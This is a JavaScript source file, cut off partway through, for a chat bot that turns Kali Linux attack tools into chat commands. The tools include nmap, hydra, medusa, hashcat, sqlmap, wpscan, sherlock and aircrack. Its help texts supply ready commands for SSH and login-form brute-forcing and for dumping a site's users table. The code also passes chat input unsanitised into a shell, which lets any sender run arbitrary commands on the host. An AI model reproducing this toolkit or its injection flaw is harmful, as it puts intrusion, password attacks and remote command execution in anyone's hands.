'use strict'
/**
 * kali_cmds.js — Dedicated per-tool Kali Linux commands for MAHNGUELOH VANTA
 *
 * Every Kali tool is its own bot command.
 * Commands run inside proot-distro Kali Linux container.
 *
 * ── SECURITY SCANNING ──────────────────────────────────
 *  .nmap      <args>              Port/service/OS scanner
 *  .masscan   <ip> <args>         Ultra-fast port scanner
 *  .nikto     -h <url>            Web vulnerability scanner
 *  .whatweb   <url>               Web tech fingerprinter
 *  .gobuster  dir -u <url> -w..   Dir/file brute-forcer
 *  .dirb      <url>               Directory brute-forcer
 *  .wfuzz     <args>              Web fuzzer
 *  .ffuf      -u <url> -w <wl>   Fast web fuzzer
 *  .wpscan    --url <url>         WordPress scanner
 *  .enum4linux <ip>               SMB/Windows enumeration
 *
 * ── PASSWORD ATTACKS ────────────────────────────────────
 *  .hydra     <args>              Network login brute-forcer
 *  .john      <hashfile>          John the Ripper cracker
 *  .hashcat   <args>              GPU hash cracker
 *  .medusa    <args>              Parallel brute-forcer
 *  .crunch    <min> <max> <chars> Wordlist generator
 *  .hashid    <hash>              Identify hash type
 *
 * ── SQL INJECTION ───────────────────────────────────────
 *  .sqlmap    -u <url>            SQL injection tool
 *
 * ── DNS & RECON ─────────────────────────────────────────
 *  .dnsrecon  -d <domain>         DNS enumeration
 *  .dnsenum   <domain>            DNS enumeration
 *  .fierce    -domain <domain>    DNS brute-forcer
 *  .subfinder -d <domain>         Subdomain discovery
 *  .amass     enum -d <domain>    Deep subdomain enum
 *
 * ── OSINT ────────────────────────────────────────────────
 *  .sherlock  <username>          Username on 300+ sites
 *  .harvester -d <domain>         Email/subdomain OSINT
 *  .geoip     <ip>                IP geolocation
 *
 * ── WIRELESS ────────────────────────────────────────────
 *  .airmon    <iface> start/stop  Monitor mode toggle
 *  .airodump  -i <iface>          WiFi packet capture
 *  .aireplay  <args>              Packet injection
 *  .aircrack  -b <bssid> <cap>    Crack WiFi key
 *  .wifite    <args>              Automated WiFi auditor
 *  .reaver    -i <iface> -b <bssid> WPS brute-force
 *
 * ── EXPLOITATION ────────────────────────────────────────
 *  .searchsploit <query>          Search ExploitDB
 *  .msfvenom  <args>              Generate payloads
 *  .msf       <command>           Run Metasploit command
 *
 * ── FORENSICS ────────────────────────────────────────────
 *  .binwalk   <file>              Firmware/binary analysis
 *  .strings   <file>              Extract readable strings
 *  .exiftool  <file>              Read file metadata
 *  .steghide  <args>              Steganography tool
 *  .foremost  -i <file>           File carving/recovery
 *  .hexdump   <file>              Hex dump of file
 *  .xxd       <file>              Hex dump (xxd format)
 *  .file      <file>              Identify file type
 *  .md5sum    <file>              MD5 checksum
 *  .sha256sum <file>              SHA-256 checksum
 *
 * ── NETWORK TOOLS (via Kali) ────────────────────────────
 *  .nc        <host> <port>       Netcat
 *  .tcpdump   <args>              Packet capture
 */

const { exec } = require('child_process')
const config   = require('../config')
const fmt      = require('../lib/format')
const os       = require('os')

const T_QUICK  = 20000
const T_MED    = 60000
const T_LONG   = 180000
const WORK_DIR = os.tmpdir()

// ── Runners ────────────────────────────────────────────────────────────────────
function run(cmd, ms = T_MED) {
    return new Promise(resolve => {
        const p = exec(cmd, { cwd: WORK_DIR, timeout: ms, maxBuffer: 15 * 1024 * 1024 }, (err, out, err2) => {
            const raw = (out || '').trim() || (err2 || '').trim() || (err?.message || 'No output')
            resolve({ ok: !err || (out || '').trim().length > 0, out: raw })
        })
        setTimeout(() => { try { p.kill('SIGKILL') } catch {} }, ms + 500)
    })
}

function kali(cmd, ms = T_MED) {
    const safe = cmd.replace(/'/g, `'\\''`)
    return run(`proot-distro login kali-rolling -- bash -c '${safe}' 2>&1`, ms)
}

function clean(txt, max = 3500) {
    const s = txt.replace(/\x1B\[[0-9;]*[mGKHF]/g, '').trim()
    if (s.length <= max) return s
    const h = Math.floor(max / 2)
    return s.slice(0, h) + '\n\n...[trimmed]...\n\n' + s.slice(-h)
}

async function reply(sock, from, title, out, msg) {
    const text = clean(out)
    if (text.length <= 3200)
        return sock.sendMessage(from, { text: fmt.box(title, [text]) }, { quoted: msg })
    await sock.sendMessage(from, { text: fmt.box(title, ['_(long output — chunks below)_']) }, { quoted: msg })
    let buf = ''
    for (const line of text.split('\n')) {
        if ((buf + '\n' + line).length > 3000) {
            await sock.sendMessage(from, { text: '```\n' + buf.trim() + '\n```' })
            buf = line
        } else buf += (buf ? '\n' : '') + line
    }
    if (buf.trim()) await sock.sendMessage(from, { text: '```\n' + buf.trim() + '\n```' })
}

async function tip(sock, from, title, lines, msg) {
    return sock.sendMessage(from, { text: fmt.box(title, lines) }, { quoted: msg })
}

function elapsed(start) { return ((Date.now() - start) / 1000).toFixed(1) + 's' }

async function autoInstall(sock, from, pkg, msg) {
    await sock.sendMessage(from, {
        text: fmt.box('📦 INSTALLING', [`_${pkg} not found — installing from Kali repos..._`])
    }, { quoted: msg })
    await kali(`DEBIAN_FRONTEND=noninteractive apt-get install -y ${pkg} 2>&1`, T_LONG)
}

async function ensureTool(sock, from, check, pkg, msg) {
    const r = await kali(`which ${check} 2>/dev/null`, 5000)
    if (!r.ok || !r.out.trim() || r.out.includes('not found')) {
        await autoInstall(sock, from, pkg, msg)
    }
}

const p = () => config.prefix

// ════════════════════════════════════════════════════════════════════════════════
//  SECURITY SCANNING
// ════════════════════════════════════════════════════════════════════════════════

async function handleNmap(sock, from, q, msg) {
    if (!q) return tip(sock, from, '📡 NMAP — Port & Service Scanner', [
        `*Usage:* ${p()}nmap <target> [options]`,
        ``,
        `*Common scans:*`,
        `◈ ${p()}nmap 192.168.1.1               — basic scan`,
        `◈ ${p()}nmap -sV 192.168.1.1            — service versions`,
        `◈ ${p()}nmap -sV -sC 192.168.1.1        — + default scripts`,
        `◈ ${p()}nmap -p- 192.168.1.1            — all 65535 ports`,
        `◈ ${p()}nmap -A 192.168.1.1             — aggressive (OS+ver+scripts)`,
        `◈ ${p()}nmap -sU 192.168.1.1            — UDP scan`,
        `◈ ${p()}nmap -sn 192.168.1.0/24         — host discovery sweep`,
        `◈ ${p()}nmap --script vuln example.com  — vulnerability scripts`,
        `◈ ${p()}nmap -p 22,80,443 example.com   — specific ports`,
    ], msg)
    await fmt.react(sock, msg, '📡')
    await ensureTool(sock, from, 'nmap', 'nmap', msg)
    const t = Date.now()
    const r = await kali(`nmap ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `📡 NMAP [${elapsed(t)}]`, r.out, msg)
}

async function handleMasscan(sock, from, q, msg) {
    if (!q) return tip(sock, from, '⚡ MASSCAN — Ultra-Fast Port Scanner', [
        `*Usage:* ${p()}masscan <ip/range> [options]`,
        ``,
        `◈ ${p()}masscan 192.168.1.1 -p1-65535 --rate=1000`,
        `◈ ${p()}masscan 10.0.0.0/24 -p80,443 --rate=500`,
        `◈ ${p()}masscan 192.168.1.1 -p0-65535 --rate=5000`,
        ``,
        `_Much faster than nmap for port discovery_`,
    ], msg)
    await fmt.react(sock, msg, '⚡')
    await ensureTool(sock, from, 'masscan', 'masscan', msg)
    const t = Date.now()
    const r = await kali(`masscan ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `⚡ MASSCAN [${elapsed(t)}]`, r.out, msg)
}

async function handleNikto(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🌐 NIKTO — Web Vulnerability Scanner', [
        `*Usage:* ${p()}nikto <options>`,
        ``,
        `◈ ${p()}nikto -h example.com`,
        `◈ ${p()}nikto -h https://example.com`,
        `◈ ${p()}nikto -h example.com -p 8080`,
        `◈ ${p()}nikto -h example.com -maxtime 60`,
        `◈ ${p()}nikto -h example.com -Tuning 1234`,
        ``,
        `_Scans for 6700+ known web vulnerabilities_`,
    ], msg)
    await fmt.react(sock, msg, '🌐')
    await ensureTool(sock, from, 'nikto', 'nikto', msg)
    await tip(sock, from, '🌐 NIKTO SCANNING', [`_Running... may take 2-5 min_`], msg)
    const t = Date.now()
    const r = await kali(`nikto ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🌐 NIKTO [${elapsed(t)}]`, r.out, msg)
}

async function handleWhatweb(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔎 WHATWEB — Web Tech Fingerprinter', [
        `*Usage:* ${p()}whatweb <url>`,
        ``,
        `◈ ${p()}whatweb example.com`,
        `◈ ${p()}whatweb https://example.com`,
        `◈ ${p()}whatweb -a 3 example.com          — aggressive mode`,
        `◈ ${p()}whatweb -v example.com             — verbose`,
        ``,
        `_Identifies CMS, frameworks, servers, versions_`,
    ], msg)
    await fmt.react(sock, msg, '🔎')
    await ensureTool(sock, from, 'whatweb', 'whatweb', msg)
    const t = Date.now()
    const r = await kali(`whatweb ${q}`, T_MED)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🔎 WHATWEB [${elapsed(t)}]`, r.out, msg)
}

async function handleGobuster(sock, from, q, msg) {
    if (!q) return tip(sock, from, '📂 GOBUSTER — Dir/File Brute-Forcer', [
        `*Usage:* ${p()}gobuster <mode> [options]`,
        ``,
        `*Directory brute-force:*`,
        `◈ ${p()}gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt`,
        `◈ ${p()}gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html`,
        ``,
        `*DNS subdomain brute-force:*`,
        `◈ ${p()}gobuster dns -d example.com -w /usr/share/wordlists/dnsmap.txt`,
        ``,
        `*Virtual host brute-force:*`,
        `◈ ${p()}gobuster vhost -u https://example.com -w /usr/share/wordlists/dirb/common.txt`,
    ], msg)
    await fmt.react(sock, msg, '📂')
    await ensureTool(sock, from, 'gobuster', 'gobuster', msg)
    await tip(sock, from, '📂 GOBUSTER RUNNING', [`_Scanning... please wait_`], msg)
    const t = Date.now()
    const r = await kali(`gobuster ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `📂 GOBUSTER [${elapsed(t)}]`, r.out, msg)
}

async function handleDirb(sock, from, q, msg) {
    if (!q) return tip(sock, from, '📂 DIRB — Directory Scanner', [
        `*Usage:* ${p()}dirb <url> [wordlist]`,
        ``,
        `◈ ${p()}dirb https://example.com`,
        `◈ ${p()}dirb https://example.com /usr/share/wordlists/dirb/big.txt`,
        `◈ ${p()}dirb https://example.com -X .php,.html`,
        `◈ ${p()}dirb https://example.com -r               — no recursion`,
    ], msg)
    await fmt.react(sock, msg, '📂')
    await ensureTool(sock, from, 'dirb', 'dirb', msg)
    const t = Date.now()
    const r = await kali(`dirb ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `📂 DIRB [${elapsed(t)}]`, r.out, msg)
}

async function handleWfuzz(sock, from, q, msg) {
    if (!q) return tip(sock, from, '💨 WFUZZ — Web Fuzzer', [
        `*Usage:* ${p()}wfuzz [options]`,
        ``,
        `◈ ${p()}wfuzz -w /usr/share/wordlists/dirb/common.txt https://example.com/FUZZ`,
        `◈ ${p()}wfuzz -w wordlist.txt -d "user=FUZZ&pass=admin" http://target/login`,
        `◈ ${p()}wfuzz -w wordlist.txt -H "Authorization: FUZZ" http://target/api`,
        `◈ ${p()}wfuzz -c -z range,1-100 http://target/item?id=FUZZ`,
    ], msg)
    await fmt.react(sock, msg, '💨')
    await ensureTool(sock, from, 'wfuzz', 'wfuzz', msg)
    const t = Date.now()
    const r = await kali(`wfuzz ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `💨 WFUZZ [${elapsed(t)}]`, r.out, msg)
}

async function handleFfuf(sock, from, q, msg) {
    if (!q) return tip(sock, from, '💨 FFUF — Fast Web Fuzzer', [
        `*Usage:* ${p()}ffuf [options]`,
        ``,
        `◈ ${p()}ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt`,
        `◈ ${p()}ffuf -u https://example.com/FUZZ -w wordlist.txt -e .php,.html,.js`,
        `◈ ${p()}ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 200`,
        `◈ ${p()}ffuf -u https://example.com/ -H "Host: FUZZ.example.com" -w subdomains.txt`,
        ``,
        `_Extremely fast — filters by status code with -mc_`,
    ], msg)
    await fmt.react(sock, msg, '💨')
    await ensureTool(sock, from, 'ffuf', 'ffuf', msg)
    const t = Date.now()
    const r = await kali(`ffuf ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `💨 FFUF [${elapsed(t)}]`, r.out, msg)
}

async function handleWpscan(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔵 WPSCAN — WordPress Vulnerability Scanner', [
        `*Usage:* ${p()}wpscan [options]`,
        ``,
        `◈ ${p()}wpscan --url https://example.com`,
        `◈ ${p()}wpscan --url https://example.com --enumerate u`,
        `◈ ${p()}wpscan --url https://example.com --enumerate p`,
        `◈ ${p()}wpscan --url https://example.com --passwords wordlist.txt --username admin`,
        ``,
        `_Detects WordPress version, plugins, themes, users_`,
    ], msg)
    await fmt.react(sock, msg, '🔵')
    await ensureTool(sock, from, 'wpscan', 'wpscan', msg)
    const t = Date.now()
    const r = await kali(`wpscan ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🔵 WPSCAN [${elapsed(t)}]`, r.out, msg)
}

async function handleEnum4linux(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🖥️ ENUM4LINUX — SMB/Windows Enumeration', [
        `*Usage:* ${p()}enum4linux [options] <ip>`,
        ``,
        `◈ ${p()}enum4linux 192.168.1.1           — all enumeration`,
        `◈ ${p()}enum4linux -U 192.168.1.1         — users`,
        `◈ ${p()}enum4linux -S 192.168.1.1         — shares`,
        `◈ ${p()}enum4linux -G 192.168.1.1         — groups`,
        `◈ ${p()}enum4linux -a 192.168.1.1         — full info`,
        ``,
        `_Great for Windows/Samba network recon_`,
    ], msg)
    await fmt.react(sock, msg, '🖥️')
    await ensureTool(sock, from, 'enum4linux', 'enum4linux', msg)
    const t = Date.now()
    const r = await kali(`enum4linux ${q}`, T_MED)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🖥️ ENUM4LINUX [${elapsed(t)}]`, r.out, msg)
}

// ════════════════════════════════════════════════════════════════════════════════
//  PASSWORD ATTACKS
// ════════════════════════════════════════════════════════════════════════════════

async function handleHydra(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔑 HYDRA — Network Login Brute-Forcer', [
        `*Usage:* ${p()}hydra [options] <target>`,
        ``,
        `*SSH brute-force:*`,
        `◈ ${p()}hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1`,
        `◈ ${p()}hydra -L users.txt -P pass.txt ssh://192.168.1.1`,
        ``,
        `*Web form brute-force:*`,
        `◈ ${p()}hydra -l admin -P rockyou.txt example.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"`,
        ``,
        `*FTP:*`,
        `◈ ${p()}hydra -l admin -P wordlist.txt ftp://192.168.1.1`,
        ``,
        `*Other protocols:*  ssh ftp http smtp rdp vnc mysql`,
    ], msg)
    await fmt.react(sock, msg, '🔑')
    await ensureTool(sock, from, 'hydra', 'hydra', msg)
    const t = Date.now()
    const r = await kali(`hydra ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🔑 HYDRA [${elapsed(t)}]`, r.out, msg)
}

async function handleJohn(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔓 JOHN — Password Cracker (John the Ripper)', [
        `*Usage:* ${p()}john [options] <hashfile>`,
        ``,
        `◈ ${p()}john hashes.txt                        — auto-detect format + crack`,
        `◈ ${p()}john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`,
        `◈ ${p()}john --format=md5 hashes.txt`,
        `◈ ${p()}john --format=sha256 hashes.txt`,
        `◈ ${p()}john --format=bcrypt hashes.txt`,
        `◈ ${p()}john --show hashes.txt                 — show cracked passwords`,
        `◈ ${p()}john --list=formats                    — list all supported formats`,
        ``,
        `_Supports MD5, SHA1, SHA256, bcrypt, NTLM, WPA..._`,
    ], msg)
    await fmt.react(sock, msg, '🔓')
    await ensureTool(sock, from, 'john', 'john', msg)
    const t = Date.now()
    const r = await kali(`john ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🔓 JOHN [${elapsed(t)}]`, r.out, msg)
}

async function handleHashcat(sock, from, q, msg) {
    if (!q) return tip(sock, from, '💻 HASHCAT — GPU Hash Cracker', [
        `*Usage:* ${p()}hashcat [options] <hash or file> <wordlist>`,
        ``,
        `◈ ${p()}hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt    — MD5`,
        `◈ ${p()}hashcat -m 100 hash.txt wordlist.txt                      — SHA1`,
        `◈ ${p()}hashcat -m 1400 hash.txt wordlist.txt                     — SHA256`,
        `◈ ${p()}hashcat -m 1800 hash.txt wordlist.txt                     — sha512crypt`,
        `◈ ${p()}hashcat -m 1000 hash.txt wordlist.txt                     — NTLM`,
        `◈ ${p()}hashcat -m 2500 capture.hccapx wordlist.txt               — WPA2`,
        `◈ ${p()}hashcat --example-hashes | grep "MODE: 0"                 — list modes`,
        ``,
        `_Add -O for optimized kernels_`,
    ], msg)
    await fmt.react(sock, msg, '💻')
    await ensureTool(sock, from, 'hashcat', 'hashcat', msg)
    const t = Date.now()
    const r = await kali(`hashcat ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `💻 HASHCAT [${elapsed(t)}]`, r.out, msg)
}

async function handleMedusa(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔑 MEDUSA — Parallel Login Brute-Forcer', [
        `*Usage:* ${p()}medusa [options]`,
        ``,
        `◈ ${p()}medusa -h 192.168.1.1 -u root -P rockyou.txt -M ssh`,
        `◈ ${p()}medusa -h 192.168.1.1 -U users.txt -P pass.txt -M ftp`,
        `◈ ${p()}medusa -h 192.168.1.1 -u admin -P pass.txt -M http`,
        `◈ ${p()}medusa -h 192.168.1.1 -u root -P pass.txt -M telnet`,
        ``,
        `*Protocols:* ssh ftp http smtp telnet mysql rdp`,
    ], msg)
    await fmt.react(sock, msg, '🔑')
    await ensureTool(sock, from, 'medusa', 'medusa', msg)
    const t = Date.now()
    const r = await kali(`medusa ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🔑 MEDUSA [${elapsed(t)}]`, r.out, msg)
}

async function handleCrunch(sock, from, q, msg) {
    if (!q) return tip(sock, from, '📝 CRUNCH — Wordlist Generator', [
        `*Usage:* ${p()}crunch <min> <max> [chars] [options]`,
        ``,
        `◈ ${p()}crunch 4 6 abc123                      — 4-6 char words from abc123`,
        `◈ ${p()}crunch 8 8 0123456789 -o /tmp/nums.txt — 8-digit numbers, save to file`,
        `◈ ${p()}crunch 6 6 abcdefghijklmnopqrstuvwxyz  — 6-char lowercase combos`,
        `◈ ${p()}crunch 4 4 -t @@## -o /tmp/words.txt   — pattern: 2 letters + 2 digits`,
        ``,
        `_Patterns: @ = lower, , = upper, % = number, ^ = symbol_`,
    ], msg)
    await fmt.react(sock, msg, '📝')
    await ensureTool(sock, from, 'crunch', 'crunch', msg)
    const t = Date.now()
    const r = await kali(`crunch ${q} 2>&1 | head -100`, T_MED)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `📝 CRUNCH [${elapsed(t)}]`, r.out, msg)
}

async function handleHashid(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔍 HASHID — Hash Type Identifier', [
        `*Usage:* ${p()}hashid <hash>`,
        ``,
        `◈ ${p()}hashid 5f4dcc3b5aa765d61d8327deb882cf99`,
        `◈ ${p()}hashid aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d`,
        `◈ ${p()}hashid "$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"`,
        ``,
        `_Identifies MD5, SHA1, SHA256, bcrypt, NTLM, etc._`,
    ], msg)
    await fmt.react(sock, msg, '🔍')

    // Auto-identify by length first (fast)
    const h = q.trim().replace(/\s/g, '')
    const lengthGuess = h.length === 32 ? 'MD5' : h.length === 40 ? 'SHA1' :
        h.length === 56 ? 'SHA224' : h.length === 64 ? 'SHA256' :
        h.length === 96 ? 'SHA384' : h.length === 128 ? 'SHA512' :
        h.startsWith('$2') ? 'bcrypt' : h.startsWith('$1$') ? 'MD5-crypt' :
        h.startsWith('$6$') ? 'SHA512-crypt' : `Unknown (len: ${h.length})`

    const r = await kali(`hash-identifier "${h}" 2>/dev/null || echo "(hash-identifier not available)"`, T_QUICK)
    await reply(sock, from, `🔍 HASHID`, [
        `*Hash:* ${h.slice(0, 40)}${h.length > 40 ? '...' : ''}`,
        `*Length:* ${h.length} chars`,
        `*Quick guess:* ${lengthGuess}`,
        ``,
        r.out,
    ].join('\n'), msg)
}

// ════════════════════════════════════════════════════════════════════════════════
//  SQL INJECTION
// ════════════════════════════════════════════════════════════════════════════════

async function handleSqlmap(sock, from, q, msg) {
    if (!q) return tip(sock, from, '💉 SQLMAP — SQL Injection Tool', [
        `*Usage:* ${p()}sqlmap [options]`,
        ``,
        `*Basic injection test:*`,
        `◈ ${p()}sqlmap -u "http://target.com/page?id=1"`,
        `◈ ${p()}sqlmap -u "http://target.com/page?id=1" --dbs`,
        `◈ ${p()}sqlmap -u "http://target.com/page?id=1" -D dbname --tables`,
        `◈ ${p()}sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump`,
        ``,
        `*POST request:*`,
        `◈ ${p()}sqlmap -u "http://target.com/login" --data="user=test&pass=test"`,
        ``,
        `*Options:*  --batch  --random-agent  --level=3  --risk=2`,
    ], msg)
    await fmt.react(sock, msg, '💉')
    await ensureTool(sock, from, 'sqlmap', 'sqlmap', msg)
    await tip(sock, from, '💉 SQLMAP RUNNING', [`_Testing... may take 2-5 min_`], msg)
    const t = Date.now()
    const r = await kali(`sqlmap ${q} --batch`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `💉 SQLMAP [${elapsed(t)}]`, r.out, msg)
}

// ════════════════════════════════════════════════════════════════════════════════
//  DNS & RECON
// ════════════════════════════════════════════════════════════════════════════════

async function handleDnsrecon(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🌍 DNSRECON — DNS Enumeration', [
        `*Usage:* ${p()}dnsrecon [options]`,
        ``,
        `◈ ${p()}dnsrecon -d example.com              — standard enum`,
        `◈ ${p()}dnsrecon -d example.com -t std        — std records (A,MX,NS,TXT)`,
        `◈ ${p()}dnsrecon -d example.com -t brt        — brute-force subdomains`,
        `◈ ${p()}dnsrecon -d example.com -t zonewalk   — zone walk`,
        `◈ ${p()}dnsrecon -d example.com -t axfr       — zone transfer attempt`,
        `◈ ${p()}dnsrecon -r 192.168.1.0/24            — reverse lookup sweep`,
    ], msg)
    await fmt.react(sock, msg, '🌍')
    await ensureTool(sock, from, 'dnsrecon', 'dnsrecon', msg)
    const t = Date.now()
    const r = await kali(`dnsrecon ${q}`, T_MED)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🌍 DNSRECON [${elapsed(t)}]`, r.out, msg)
}

async function handleDnsenum(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🌍 DNSENUM — DNS Enumeration', [
        `*Usage:* ${p()}dnsenum <domain>`,
        ``,
        `◈ ${p()}dnsenum example.com`,
        `◈ ${p()}dnsenum --threads 5 example.com`,
        `◈ ${p()}dnsenum --dnsserver 8.8.8.8 example.com`,
        ``,
        `_Finds subdomains, MX, NS, zone transfers_`,
    ], msg)
    await fmt.react(sock, msg, '🌍')
    await ensureTool(sock, from, 'dnsenum', 'dnsenum', msg)
    const t = Date.now()
    const r = await kali(`dnsenum ${q}`, T_MED)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🌍 DNSENUM [${elapsed(t)}]`, r.out, msg)
}

async function handleFierce(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔥 FIERCE — DNS Brute-Forcer', [
        `*Usage:* ${p()}fierce [options]`,
        ``,
        `◈ ${p()}fierce --domain example.com`,
        `◈ ${p()}fierce --domain example.com --subdomains admin,mail,ftp`,
        `◈ ${p()}fierce --domain example.com --dns-servers 8.8.8.8`,
        ``,
        `_Discovers non-contiguous IP space and subdomains_`,
    ], msg)
    await fmt.react(sock, msg, '🔥')
    await ensureTool(sock, from, 'fierce', 'fierce', msg)
    const t = Date.now()
    const r = await kali(`fierce ${q}`, T_MED)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🔥 FIERCE [${elapsed(t)}]`, r.out, msg)
}

async function handleSubfinder(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔍 SUBFINDER — Subdomain Discovery', [
        `*Usage:* ${p()}subfinder [options]`,
        ``,
        `◈ ${p()}subfinder -d example.com`,
        `◈ ${p()}subfinder -d example.com -silent`,
        `◈ ${p()}subfinder -d example.com -o /tmp/subs.txt`,
        `◈ ${p()}subfinder -dL domains.txt -o results.txt`,
        ``,
        `_Uses passive sources: Shodan, VirusTotal, crt.sh..._`,
    ], msg)
    await fmt.react(sock, msg, '🔍')
    await ensureTool(sock, from, 'subfinder', 'subfinder', msg)
    const t = Date.now()
    const r = await kali(`subfinder ${q}`, T_MED)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🔍 SUBFINDER [${elapsed(t)}]`, r.out, msg)
}

async function handleAmass(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🕵️ AMASS — Deep Subdomain Enumeration', [
        `*Usage:* ${p()}amass [mode] [options]`,
        ``,
        `◈ ${p()}amass enum -d example.com`,
        `◈ ${p()}amass enum -passive -d example.com`,
        `◈ ${p()}amass enum -d example.com -o /tmp/amass.txt`,
        `◈ ${p()}amass intel -org "Example Inc"`,
        `◈ ${p()}amass intel -whois -d example.com`,
        ``,
        `_Deep recon using OSINT + brute-force_`,
    ], msg)
    await fmt.react(sock, msg, '🕵️')
    await ensureTool(sock, from, 'amass', 'amass', msg)
    await tip(sock, from, '🕵️ AMASS RUNNING', [`_Deep scan — may take several minutes_`], msg)
    const t = Date.now()
    const r = await kali(`amass ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🕵️ AMASS [${elapsed(t)}]`, r.out, msg)
}

// ════════════════════════════════════════════════════════════════════════════════
//  OSINT
// ════════════════════════════════════════════════════════════════════════════════

async function handleSherlock(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🕵️ SHERLOCK — Username Tracker', [
        `*Usage:* ${p()}sherlock <username>`,
        ``,
        `◈ ${p()}sherlock john_doe`,
        `◈ ${p()}sherlock "john doe"`,
        `◈ ${p()}sherlock username1 username2`,
        ``,
        `_Searches 300+ social media & online platforms_`,
        `_Returns all sites where username exists_`,
    ], msg)
    await fmt.react(sock, msg, '🕵️')
    await ensureTool(sock, from, 'sherlock', 'sherlock', msg)
    await tip(sock, from, '🕵️ SHERLOCK HUNTING', [`_Searching 300+ platforms... please wait_`], msg)
    const t = Date.now()
    const r = await kali(`sherlock ${q} 2>&1`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🕵️ SHERLOCK: ${q} [${elapsed(t)}]`, r.out, msg)
}

async function handleHarvester(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🌾 THEHARVESTER — Email & Domain OSINT', [
        `*Usage:* ${p()}harvester [options]`,
        ``,
        `◈ ${p()}harvester -d example.com -b google`,
        `◈ ${p()}harvester -d example.com -b bing,google,duckduckgo`,
        `◈ ${p()}harvester -d example.com -b all -l 100`,
        ``,
        `_Finds: emails, subdomains, IPs, open ports_`,
        `*Sources:* google bing duckduckgo yahoo hunter shodan`,
    ], msg)
    await fmt.react(sock, msg, '🌾')
    await ensureTool(sock, from, 'theHarvester', 'theharvester', msg)
    await tip(sock, from, '🌾 HARVESTER RUNNING', [`_Collecting intel..._`], msg)
    const t = Date.now()
    const r = await kali(`theHarvester ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🌾 HARVESTER [${elapsed(t)}]`, r.out, msg)
}

async function handleGeoip(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🌍 GEOIP — IP Geolocation', [
        `*Usage:* ${p()}geoip <ip>`,
        ``,
        `◈ ${p()}geoip 8.8.8.8`,
        `◈ ${p()}geoip 1.1.1.1`,
        `◈ ${p()}geoip 192.168.1.1   — (private IPs show no location)`,
        ``,
        `_Returns: country, region, city, ISP, org, coordinates_`,
    ], msg)
    await fmt.react(sock, msg, '🌍')
    const r = await run(`curl -s --max-time 10 "https://ipinfo.io/${q}/json" 2>&1`, T_QUICK)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🌍 GEOIP: ${q}`, r.out, msg)
}

// ════════════════════════════════════════════════════════════════════════════════
//  WIRELESS
// ════════════════════════════════════════════════════════════════════════════════

async function handleAirmon(sock, from, q, msg) {
    if (!q) return tip(sock, from, '📶 AIRMON-NG — Monitor Mode', [
        `*Usage:* ${p()}airmon <interface> <action>`,
        ``,
        `◈ ${p()}airmon wlan0 start       — enable monitor mode`,
        `◈ ${p()}airmon wlan0mon stop      — stop monitor mode`,
        `◈ ${p()}airmon check              — check conflicting processes`,
        `◈ ${p()}airmon check kill         — kill conflicting processes`,
        ``,
        `_Monitor mode = wlan0 becomes wlan0mon_`,
    ], msg)
    await fmt.react(sock, msg, '📶')
    await ensureTool(sock, from, 'airmon-ng', 'aircrack-ng', msg)
    const t = Date.now()
    const r = await kali(`airmon-ng ${q}`, T_QUICK)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `📶 AIRMON-NG [${elapsed(t)}]`, r.out, msg)
}

async function handleAirodump(sock, from, q, msg) {
    if (!q) return tip(sock, from, '📡 AIRODUMP-NG — WiFi Packet Capture', [
        `*Usage:* ${p()}airodump [options] <interface>`,
